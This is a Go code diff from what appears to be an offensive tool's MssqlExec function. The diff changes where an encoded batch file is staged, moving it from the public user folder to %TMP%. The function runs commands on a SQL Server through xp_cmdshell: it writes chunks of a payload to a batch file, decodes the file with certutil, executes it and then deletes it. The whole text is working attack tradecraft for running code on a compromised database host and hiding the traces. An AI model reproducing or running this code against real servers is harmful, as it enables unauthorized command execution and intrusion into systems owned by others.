@@ -88,11 +88,11 @@ func MssqlExec(db *sql.DB, cmd string) {
 					} else {
 						tmpcmd = cmd[i*flag : (i+1)*flag]
 					}
-					tmpcmd = fmt.Sprintf(`echo|set /p="%s">>C:/Users/Public/q147.bat`, tmpcmd)
+					tmpcmd = fmt.Sprintf(`echo|set /p="%s">>%s/q147.bat`, tmpcmd, "%TMP%")
 					db.ExecContext(ctx, fmt.Sprintf("exec master..xp_cmdshell '%s'", tmpcmd))
 				}
-				db.ExecContext(ctx, "exec master..xp_cmdshell 'certutil -f -decode C:/Users/Public/q147.bat C:/Users/Public/q147.bat'")
-				db.ExecContext(ctx, "exec master..xp_cmdshell 'C:/Users/Public/q147.bat & del C:\\Users\\Public\\q147.bat'")
+				db.ExecContext(ctx, "exec master..xp_cmdshell 'certutil -f -decode %TMP%/q147.bat %TMP%/q147.bat'")
+				db.ExecContext(ctx, "exec master..xp_cmdshell '%TMP%/q147.bat & del %TMP%\\q147.bat'")
 			} else {
 				db.ExecContext(ctx, fmt.Sprintf("exec master..xp_cmdshell '%s'", cmd))
 			}
